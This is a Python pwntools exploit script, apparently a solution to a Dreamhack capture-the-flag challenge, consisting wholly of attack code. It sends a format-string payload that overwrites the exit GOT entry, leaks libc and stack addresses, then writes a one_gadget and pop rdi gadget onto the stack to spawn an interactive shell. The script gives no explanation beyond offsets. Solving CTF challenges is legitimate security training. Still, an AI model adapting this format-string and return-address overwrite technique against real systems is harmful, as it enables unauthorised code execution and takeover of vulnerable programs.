from pwn import *

r = remote("host3.dreamhack.games", 21347)
e = ELF("./chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

r.sendlineafter(b"num1 : ", b"9999999999")
r.sendlineafter(b"num2 : ", b"9999999999")

exit_got = 0x404048

# rsi rdx rcx r8 r9 rsp(6) rsp+
payload = b"%45$p%30" + b"$p%41989" + b"51c%15$n" + p64(exit_got)
r.sendlineafter(b"Who are you?? : ", payload)
r.recvuntil(b"Congratulations ")

libc_base = int(r.recvn(14), 16) - 128 + 0xb0 - libc.symbols["__libc_start_main"]
stack_ret = int(r.recvn(14), 16) + 0x28 - 0x1d0
stack_og = stack_ret + 0x10
og = libc_base + 0xebc85
pop_rdi = libc_base + 0x2a3e5

r.recvuntil(b" "*4198900)
og_list = []
gadget_list = []
for i in range(13, 2, -4):
    og_list.append(int(hex(og)[i-3:i+1], 16))
    gadget_list.append(int(hex(pop_rdi)[i-3:i+1], 16))

global_list = sorted(og_list + gadget_list)
payload = b"%21$n"
for i in range(len(global_list)):
    if i==0:
        payload += f"%{global_list[i]}c%00$hn".encode()
        continue
    if global_list[i] == global_list[i-1]:
        payload += f"%00$hn".encode()
    else:
        payload += f"%{global_list[i] - global_list[i-1]}c%00$hn".encode()

payload += b"A"*(8-len(payload)%8)
payload += p64(stack_og+6)
index = len(payload)//8 + 12

flag = False
for i in range(len(global_list)):
    if flag:
        flag=False
        continue
    for j in range(len(og_list)):
        if global_list[i] == og_list[j]:
            payload += p64(stack_og+j*2)
            payload = payload.replace(b"%00", f"%{index}".encode(), 1)
            index += 1
            if i!=len(global_list)-1 and global_list[i] == global_list[i+1]:
                payload += p64(stack_ret+j*2)
                payload = payload.replace(b"%00", f"%{index}".encode(), 1)
                index += 1
                flag = True
            break
        elif global_list[i] == gadget_list[j]:
            print(f"{global_list[i]} is in gadget_list")
            payload += p64(stack_ret+j*2)
            payload = payload.replace(b"%00", f"%{index}".encode(), 1)
            index += 1
            break

payload = payload.replace(b"%00", f"%{index}".encode(), 1)
index += 1
payload = payload.replace(b"%00", f"%{index}".encode(), 1)
print(payload, len(payload))

r.sendlineafter(b"Who are you?? : ", payload)
r.recvuntil(b"\x7f")
r.interactive()